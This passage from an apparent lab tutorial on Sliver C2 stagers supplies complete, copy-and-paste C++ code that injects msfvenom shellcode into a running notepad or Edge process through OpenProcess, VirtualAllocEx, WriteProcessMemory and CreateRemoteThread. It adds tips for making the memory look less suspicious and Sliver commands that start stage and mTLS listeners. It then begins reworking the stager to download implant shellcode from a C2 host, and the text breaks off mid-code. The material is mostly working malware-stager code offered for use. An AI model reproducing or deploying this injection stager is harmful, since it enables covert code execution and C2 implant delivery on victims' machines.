+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname);
+
+DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize) {
+    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwSize; i<span style="color:#f92672">++</span>) {
+        pid <span style="color:#f92672">=</span> GetFirstPIDProcname(aszProclist[i]);
+        <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+            <span style="color:#66d9ef">return</span> pid;
+        }
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Time to get serious and write <code>GetFirstPIDProcname</code>.
+There is a Windows API to take a snapshot of process-related data.
+It works as follows.
+First use
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot</a>
+to get a handle to the snapshot data.
+This allows you to use
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first">Process32First</a>
+to retrieve information about the first process.
+Then, use
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next">Process32Next</a>
+to iteratively retrieve information about all other processes until
+you find one whose name matches or none are left.
+For an official example, see the <a href="https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes">Microsoft docs</a>.</p>
+<p>Process data must be loaded into a struct of type
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32">PROCESSENTRY32</a>.
+It has a field <code>szExeFile</code> which is the name as a string.</p>
+<p>Below you can see the implementation.
+As usual when you get handles to things, don’t forget to close them with <code>CloseHandle</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname) {
+    HANDLE hProcessSnapshot <span style="color:#f92672">=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">if</span> (INVALID_HANDLE_VALUE <span style="color:#f92672">==</span> hProcessSnapshot) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Process32First(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
+        CloseHandle(hProcessSnapshot);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }
+
+    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">while</span> (Process32Next(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
+        <span style="color:#66d9ef">if</span> (lstrcmpiW(szProcname, pe32.szExeFile) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+            pid <span style="color:#f92672">=</span> pe32.th32ProcessID;
+            printf(<span style="color:#e6db74">"Process found: %d %ls</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, pid, pe32.szExeFile);
+            <span style="color:#66d9ef">break</span>;
+        }
+    }
+
+    CloseHandle(hProcessSnapshot);
+    <span style="color:#66d9ef">return</span> pid;
+}
+</code></pre></div><p>Now on to <code>GetShellcode</code>.
+For development, I just take the message box shellcode from an array
+and put that into the <code>Shellcode</code> struct.
+That is, the payload is hardcoded into the stager:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">// msfvenom -f c --arch x64 -p windows/x64/messagebox EXITFUNC=thread
+</span><span style="color:#75715e"></span>BYTE aShellcode[] <span style="color:#f92672">=</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51</span><span style="color:#e6db74">"</span>
+...
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d\x65\x73</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x73\x61\x67\x65\x42\x6f\x78\x00</span><span style="color:#e6db74">"</span>;
+
+BOOL <span style="color:#a6e22e">GetShellcode</span>(Shellcode<span style="color:#f92672">*</span> shellcode) {
+    (<span style="color:#f92672">*</span>shellcode).pcData <span style="color:#f92672">=</span> aShellcode;
+    (<span style="color:#f92672">*</span>shellcode).dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(aShellcode);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+</code></pre></div><p>This is a viable approach for short shellcode.
+Do it with a Sliver implant though and you get a pretty large compiled binary
+(and a pretty large source code file too).
+In the next subsection, we’ll change the implementation such that Sliver implant
+shellcode is loaded via HTTP from a stage listener.</p>
+<p>For now though, let’s finish development by implementing process injection.
+Time for Windows APIs again.
+First, we need a handle to the process.
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess</a>
+is the function that returns such things.
+We call it this way:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(
+        PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD,
+        FALSE,
+        dwPID);
+</code></pre></div><p>Apart from the PID you must give it an argument <code>dwDesiredAccess</code>,
+with which you specify the
+<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">process access rights</a>
+you would like to have.
+The following three rights are relevant here:</p>
+<ul>
+<li><code>PROCESS_VM_OPERATION</code>: required to perform operations on the process address space</li>
+<li><code>PROCESS_VM_WRITE</code>: required to write to the process memory</li>
+<li><code>PROCESS_CREATE_THREAD</code>: required to create a thread in the process</li>
+</ul>
+<p>Given the handle, we then use
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a>
+to allocate memory for the shellcode.
+We call it this way:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">LPVOID pRemoteAddr <span style="color:#f92672">=</span> VirtualAllocEx(
+        hProcess, 
+        NULL, 
+        shellcode.dwSize, 
+        (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), 
+        PAGE_EXECUTE_READ);
+</code></pre></div><p>Two of this function’s arguments deserve more explanations. The first is <code>flAllocationType</code>.
+Process memory can be “reserved”, meaning that the process will reserve space for it in it’s virtual address space,
+but no physical memory is allocated yet.
+Memory can also be “committed”, in which case it reserved and also allocated physically.
+To do it in one step, use <code>MEM_RESERVE | MEM_COMMIT</code> as allocation type.</p>
+<p>The second argument is <code>flProtect</code>, used to define what can be done with the memory.
+You can pass any of the <a href="https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants">Memory Protection Constants</a>.
+Grossly simplified, memory may any combination of readable, writable and executable.</p>
+<p>Your first reaction might thus be to set it to <code>PAGE_EXECUTE_READWRITE</code> just to be on the safe side.
+However, such memory regions are highly unusual and look suspicious.
+Some sources in the internet (<a href="https://secarma.com/process-injection-part-2-modern-process-injection/">example</a>)
+therefore recommend to set <code>PAGE_READWRITE</code> first, write the shellcode and after that use a function called
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a>
+to switch to <code>PAGE_EXECUTE_READ</code>.
+Imagine my astonishment as I tried tried to do exactly that, accidentally forgot to use <code>VirtualProcect</code>, but it worked nevertheless.
+As a person who is used to write his code in Vim I frantically started to search for ways in which I might have broken Visual Studio,
+this bloated behemoth of an IDE that is clearly not compiling the code entered into it’s editor window.
+After all, how can writing to memory possibly succeed if it’s allocated with <code>PAGE_EXECUTE_READ</code>?
+Well, it turned out that Visual Studio was not broken.
+On Google, I found <a href="https://theevilbit.blogspot.com/2018/08/about-writeprocessmemory.html">this</a>.
+The short story: you can write to memory allocated as <code>PAGE_EXECUTE_READ</code> as long as you have the <code>PROCESS_VM_OPERATION</code> access right,
+even though official documentation says it does not work, because Windows temporarily changes the protection for you.</p>
+<p>Ok, so we can write to the memory.
+This is done with a function
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a>,
+which we call like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL err <span style="color:#f92672">=</span> WriteProcessMemory(
+        hProcess,
+        pRemoteAddr,
+        shellcode.pcData,
+        shellcode.dwSize,
+        NULL);
+</code></pre></div><p>The arguments we set should be self-explanatory, so let’s just move on and start a thread.
+We use <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a>
+for it.
+It’s arguments should be equally self-explanatory.
+We call it this way:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(
+        hProcess, 
+        NULL, 
+        <span style="color:#ae81ff">0</span>, 
+        (LPTHREAD_START_ROUTINE)pRemoteAddr, 
+        NULL, 
+        <span style="color:#ae81ff">0</span>, 
+        NULL);
+</code></pre></div><p>The four functions calls discussed above are all we need for process injection.
+Adding a bit of error checking and handle closing, we get this code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode) {
+    HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD, FALSE, dwPID);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hProcess) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; };
+    
+    LPVOID pRemoteAddr <span style="color:#f92672">=</span> VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), PAGE_EXECUTE_READ);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pRemoteAddr) {
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    };
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    };
+
+    HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(hProcess, NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, <span style="color:#ae81ff">0</span>, NULL);
+    <span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">!=</span> NULL) {
+        WaitForSingleObject(hThread, <span style="color:#ae81ff">500</span>);
+
+        CloseHandle(hThread);
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+    }
+
+    CloseHandle(hProcess);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Combining all the code and adding the required includes,
+we get the code you can see below.
+You should be able to copy &amp; paste it to Visual Studio to get a stager
+that tries to pop a message box in either a notepad or Edge process
+(provided the process is 64bit):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;tlhelp32.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+
+<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> {
+    BYTE<span style="color:#f92672">*</span> pcData;
+    DWORD dwSize;
+};
+
+
+DWORD <span style="color:#a6e22e">GetTargetPID</span>();
+BOOL <span style="color:#a6e22e">GetShellcode</span>(Shellcode<span style="color:#f92672">*</span> shellcode);
+BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode);
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#75715e">//::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window
+</span><span style="color:#75715e"></span>    
+    DWORD pid <span style="color:#f92672">=</span> GetTargetPID();
+    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
+
+    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> shellcode;
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetShellcode(<span style="color:#f92672">&amp;</span>shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>; }
+
+    printf(<span style="color:#e6db74">"Injecting %ld bytes into PID %ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, shellcode.dwSize, pid);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Inject(pid, shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>; }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#75715e">// ------ Getting the shellcode ------ //
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// msfvenom -f c --arch x64 -p windows/x64/messagebox EXITFUNC=thread
+</span><span style="color:#75715e"></span>BYTE aShellcode[] <span style="color:#f92672">=</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x85\x2b\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x48\x65\x6c\x6c\x6f</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d\x65\x73</span><span style="color:#e6db74">"</span>
+<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x73\x61\x67\x65\x42\x6f\x78\x00</span><span style="color:#e6db74">"</span>;
+
+BOOL <span style="color:#a6e22e">GetShellcode</span>(Shellcode<span style="color:#f92672">*</span> shellcode) {
+    (<span style="color:#f92672">*</span>shellcode).pcData <span style="color:#f92672">=</span> aShellcode;
+    (<span style="color:#f92672">*</span>shellcode).dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(aShellcode);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+
+<span style="color:#75715e">// ------ Finding a target process ------ //
+</span><span style="color:#75715e"></span>
+DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize);
+DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname);
+
+DWORD <span style="color:#a6e22e">GetTargetPID</span>() {
+    <span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> aszProclist[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">"notepad.exe"</span>,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">"msedge.exe"</span>
+    };
+    <span style="color:#66d9ef">return</span> GetFirstPIDProclist(aszProclist, <span style="color:#66d9ef">sizeof</span>(aszProclist) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(aszProclist[<span style="color:#ae81ff">0</span>]));
+}
+
+DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize) {
+    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwSize; i<span style="color:#f92672">++</span>) {
+        pid <span style="color:#f92672">=</span> GetFirstPIDProcname(aszProclist[i]);
+        <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+            <span style="color:#66d9ef">return</span> pid;
+        }
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname) {
+    HANDLE hProcessSnapshot <span style="color:#f92672">=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">if</span> (INVALID_HANDLE_VALUE <span style="color:#f92672">==</span> hProcessSnapshot) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Process32First(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
+        CloseHandle(hProcessSnapshot);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }
+
+    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">while</span> (Process32Next(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
+        <span style="color:#66d9ef">if</span> (lstrcmpiW(szProcname, pe32.szExeFile) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+            pid <span style="color:#f92672">=</span> pe32.th32ProcessID;
+            printf(<span style="color:#e6db74">"Process found: %d %ls</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, pid, pe32.szExeFile);
+            <span style="color:#66d9ef">break</span>;
+        }
+    }
+
+    CloseHandle(hProcessSnapshot);
+    <span style="color:#66d9ef">return</span> pid;
+}
+
+<span style="color:#75715e">// ------ Injecting into process ------ //
+</span><span style="color:#75715e"></span>
+BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode) {
+    HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD, FALSE, dwPID);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hProcess) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; };
+    
+    LPVOID pRemoteAddr <span style="color:#f92672">=</span> VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), PAGE_EXECUTE_READ);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pRemoteAddr) {
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    };
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    };
+
+    HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(hProcess, NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, <span style="color:#ae81ff">0</span>, NULL);
+    <span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">!=</span> NULL) {
+        WaitForSingleObject(hThread, <span style="color:#ae81ff">500</span>);
+
+        CloseHandle(hThread);
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+    }
+
+    CloseHandle(hProcess);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Time to make a message box appear on screen.
+Open up notepad, then run the program.
+The result should be similar to what you can see in the screenshot below.
+A terminal window should print the notepad’s PID and you should also see the message box:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/30_sliver_c2_stagers_process_injection/msgbox_appeared_in_notepad.png">
+    
+  
+  
+  <figcaption>
+    <header><b>A message box appeared after running the program</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Let’s have a closer look at the “notepad.exe” process to convince ourselves that it was really this process
+which created the message box.
+Download the incredibly useful tool <a href="https://processhacker.sourceforge.io/">Process Hacker</a>
+and run it, ideally with Administrator privileges.
+It shows you a list of processes, as seen in the lower right of the screenshot below.
+Locate “notepad.exe” and double-click it to open a window showing the process properties.
+Find the tab “Memory”, which shows you a list of all the memory regions.
+Process Hacker lists the base address, size, protection, which DLL belongs to the region and much more.
+Double-click a region to see a hex-dump of the actual memory.</p>
+<p>Now try to find the memory we allocated in the “notepad.exe” process.
+You are looking for a region with protection “RX” (<code>PAGE_EXECUTE_READ</code>) which is not associated
+with a DLL (since we did not load it from disk but wrote it directly).
+If you find the region, it’s content should look like in the screenshot below.
+There should be a short block of non-zero content containing exactly the bytes
+from the <code>aShellcode</code> array in our code:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/30_sliver_c2_stagers_process_injection/notepad_has_shellcode_in_memory.png">
+    
+  
+  
+  <figcaption>
+    <header><b>The shellcode can be found in the notepad.exe memory using Process Hacker</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<h3 id="finalizing-the-stager">Finalizing the Stager</h3>
+<p>We know now that process injection works fine.
+Time to plug Sliver into the stager.
+In the <a href="../../post/learning_sliver_c2_06_stagers/#c-stager">previous post</a>,
+I’ve demonstrated how to write a C++ stager that downloads Sliver implant
+shellcode from an HTTP stage listener.
+Here I’ll reuse the download code from that post.</p>
+<p>To prepare, we need the stage listener in the Sliver C2 server.
+Connect to your Sliver console.
+You can create your implant profile with <code>profiles new --mtls sliver.labnet.local --skip-symbols --format shellcode --arch amd64 win64</code>
+(unless you already have one), then start the listeners:</p>
+<pre tabindex="0"><code>sliver &gt; stage-listener --url http://sliver.labnet.local:80 --profile win64
+
+[*] No builds found for profile win64, generating a new one
+[*] Job 1 (http) started
+
+sliver &gt;  mtls
+
+[*] Starting mTLS listener ...
+
+[*] Successfully started job #2
+</code></pre><p>Back on the Windows host, we now add code to connect to the server.
+In the <code>main</code> function, we take out the function <code>GetShellcode</code>
+and plug in a function <code>Download</code>, which downloads the shellcode
+from the stage listener located at <code>host</code> and <code>port</code>,
+which we hardcode to <code>sliver.labnet.local:80</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#75715e">//::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window
+</span><span style="color:#75715e"></span>    
+    DWORD pid <span style="color:#f92672">=</span> GetTargetPID();
+    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
+
+    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> shellcode;
